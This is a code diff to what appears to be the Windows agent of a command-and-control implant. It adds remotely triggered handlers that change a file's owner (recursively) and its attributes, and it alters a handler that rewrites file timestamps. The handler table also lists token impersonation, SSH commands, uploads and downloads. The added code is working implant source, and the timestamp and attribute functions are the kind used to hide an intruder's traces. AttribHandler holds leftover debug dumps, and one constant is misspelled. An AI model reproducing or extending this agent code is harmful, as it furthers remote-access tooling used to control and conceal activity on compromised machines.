@@ -1609,6 +1609,83 @@ CLEANUP:
 	return pResult;
 }
 
+BOOL ChownHandlerCallback
+(
+	_In_ LPWSTR lpPath,
+	_In_ LPSTR lpUserName
+)
+{
+	SetFileOwner(lpPath, lpUserName);
+
+	return FALSE;
+}
+
+PENVELOPE ChownHandler
+(
+	_In_ PENVELOPE pEnvelope
+)
+{
+	PPBElement ReqElements[3];
+	PENVELOPE pResult = NULL;
+	LPVOID* UnmarshaledData = NULL;
+	DWORD i = 0;
+	LPWSTR lpPath = NULL;
+	LPSTR lpUserName = NULL;
+	BOOL Recursive = FALSE;
+	BOOL IsFolder = FALSE;
+
+	for (i = 0; i < _countof(ReqElements); i++) {
+		ReqElements[i] = ALLOC(sizeof(PBElement));
+		ReqElements[i]->dwFieldIdx = i + 1;
+		ReqElements[i]->Type = Bytes;
+	}
+
+	ReqElements[2]->Type = Varint;
+	UnmarshaledData = UnmarshalStruct(ReqElements, _countof(ReqElements), pEnvelope->pData->pBuffer, pEnvelope->pData->cbBuffer, NULL);
+	if (UnmarshaledData == NULL || UnmarshaledData[0] == NULL || UnmarshaledData[1] == NULL) {
+		goto CLEANUP;
+	}
+
+	lpPath = ConvertCharToWchar(((PBUFFER)UnmarshaledData[0])->pBuffer);
+	lpUserName = DuplicateStrA(((PBUFFER)UnmarshaledData[1])->pBuffer, 0);
+	if (!IsPathExist(lpPath)) {
+		LogError(L"%s is not found", lpPath);
+		goto CLEANUP;
+	}
+
+	if (IsFolderExist(lpPath)) {
+		IsFolder = TRUE;
+	}
+
+	if (IsFolder && UnmarshaledData[2] != NULL) {
+		Recursive = TRUE;
+	}
+
+	if (!SetFileOwner(lpPath, lpUserName)) {
+		goto CLEANUP;
+	}
+
+	if (IsFolder && Recursive) {
+		ListFileEx(lpPath, LIST_RECURSIVELY, (LIST_FILE_CALLBACK)ChownHandlerCallback, lpUserName);
+	}
+
+	pResult = ALLOC(sizeof(ENVELOPE));
+	pResult->uID = pEnvelope->uID;
+CLEANUP:
+	FREE(lpUserName);
+	FREE(lpPath);
+	for (i = 0; i < _countof(ReqElements); i++) {
+		FREE(ReqElements[i]);
+	}
+
+	if (UnmarshaledData != NULL) {
+		FREE(UnmarshaledData[0]);
+		FREE(UnmarshaledData);
+	}
+
+	return pResult;
+}
+
 PENVELOPE IcaclsHandler
 (
 	_In_ PENVELOPE pEnvelope
@@ -3932,6 +4009,7 @@ PENVELOPE ChtimesHandler
 )
 {
 	PPBElement ReqElements[4];
+	PPBElement pFinalElement = NULL;
 	DWORD i = 0;
 	PENVELOPE pResult = NULL;
 	LPVOID* UnmarshaledData = NULL;
@@ -3943,6 +4021,7 @@ PENVELOPE ChtimesHandler
 	FILETIME LastWriteTime;
 	SYSTEMTIME Temp;
 	INT UTCOffset = 0;
+	PBUFFER pTemp = NULL;
 
 	UTCOffset = GetUTFOffset();
 	for (i = 0; i < _countof(ReqElements); i++) {
@@ -3957,7 +4036,8 @@ PENVELOPE ChtimesHandler
 		goto CLEANUP;
 	}
 
-	lpPath = ConvertCharToWchar(((PBUFFER)UnmarshaledData[0])->pBuffer);
+	pTemp = (PBUFFER)UnmarshaledData[0];
+	lpPath = ConvertCharToWchar(pTemp->pBuffer);
 	if (!IsPathExist(lpPath)) {
 		LogError(L"%s is not exist", lpPath);
 		goto CLEANUP;
@@ -4010,13 +4090,76 @@ PENVELOPE ChtimesHandler
 		goto CLEANUP;
 	}
 
+	pFinalElement = CreateBytesElement(pTemp->pBuffer, pTemp->cbBuffer, 1);
 	pResult = ALLOC(sizeof(ENVELOPE));
 	pResult->uID = pEnvelope->uID;
+	pResult->pData = BufferMove(pFinalElement->pMarshaledData, pFinalElement->cbMarshaledData);
+	pFinalElement->pMarshaledData = NULL;
 CLEANUP:
+	FreeElement(pFinalElement);
 	if (hFile != INVALID_HANDLE_VALUE) {
 		CloseHandle(hFile);
 	}
 
+	FREE(lpPath);
+	for (i = 0; i < _countof(ReqElements); i++) {
+		FREE(ReqElements[i]);
+	}
+
+	if (UnmarshaledData != NULL) {
+		FREE(UnmarshaledData[0]);
+		FREE(UnmarshaledData);
+	}
+
+	return pResult;
+}
+
+PENVELOPE AttribHandler
+(
+	_In_ PENVELOPE pEnvelope
+)
+{
+	PPBElement ReqElements[2];
+	DWORD i = 0;
+	PENVELOPE pResult = NULL;
+	LPVOID* UnmarshaledData = NULL;
+	LPWSTR lpPath = NULL;
+	DWORD dwNewAttrib = 0;
+	PBUFFER pTemp = NULL;
+
+	for (i = 0; i < _countof(ReqElements); i++) {
+		ReqElements[i] = ALLOC(sizeof(PBElement));
+		ReqElements[i]->dwFieldIdx = i + 1;
+	}
+
+	ReqElements[0]->Type = Bytes;
+	ReqElements[1]->Type = Varint;
+	UnmarshaledData = UnmarshalStruct(ReqElements, _countof(ReqElements), pEnvelope->pData->pBuffer, pEnvelope->pData->cbBuffer, NULL);
+	if (UnmarshaledData == NULL || UnmarshaledData[0] == NULL || UnmarshaledData[1] == NULL) {
+		goto CLEANUP;
+	}
+
+	pTemp = (PBUFFER)UnmarshaledData[0];
+	PrintFormatA("Print path:\n");
+	HexDump(pTemp->pBuffer, pTemp->cbBuffer);
+	lpPath = ConvertCharToWchar(pTemp->pBuffer);
+	PrintFormatA("\n------------------------\n");
+	HexDump(lpPath, lstrlenW(lpPath) * sizeof(WCHAR));
+	HexDump(pTemp->pBuffer, pTemp->cbBuffer);
+	dwNewAttrib = (DWORD)UnmarshaledData[1];
+	if (!IsPathExist(lpPath)) {
+		LogError(L"%s is not found", lpPath);
+		goto CLEANUP;
+	}
+	
+	if (!SetFileAttributesW(lpPath, dwNewAttrib)) {
+		LOG_ERROR("SetFileAttributesW", GetLastError());
+		goto CLEANUP;
+	}
+
+	pResult = ALLOC(sizeof(ENVELOPE));
+	pResult->uID = pEnvelope->uID;
+CLEANUP:
 	FREE(lpPath);
 	for (i = 0; i < _countof(ReqElements); i++) {
 		FREE(ReqElements[i]);
@@ -4472,6 +4615,7 @@ REQUEST_HANDLER* GetSystemHandler()
 	/*HandlerList[MsgStartServiceByNameReq] = StartServiceByNameHandler;*/
 	HandlerList[MsgPing] = PingHandler;
 	HandlerList[MsgLsReq] = LsHandler;
+	HandlerList[MsgChownReq] = ChownHandler;
 	HandlerList[MsgDownloadReq] = DownloadHandler;
 	HandlerList[MsgUploadReq] = UploadHandler;
 	HandlerList[MsgCdReq] = CdHandler;
@@ -4506,6 +4650,7 @@ REQUEST_HANDLER* GetSystemHandler()
 	HandlerList[MsgMakeTokenReq] = MakeTokenHandler;
 	HandlerList[MsgReconfigureReq] = NULL;
 	HandlerList[MsgSSHCommandReq] = NULL;
+	HandlerList[MSgAttribReq] = AttribHandler;
 	HandlerList[MsgChtimesReq] = ChtimesHandler;
 	HandlerList[MsgRegisterExtensionReq] = NULL;
 	HandlerList[MsgCallExtensionReq] = NULL;
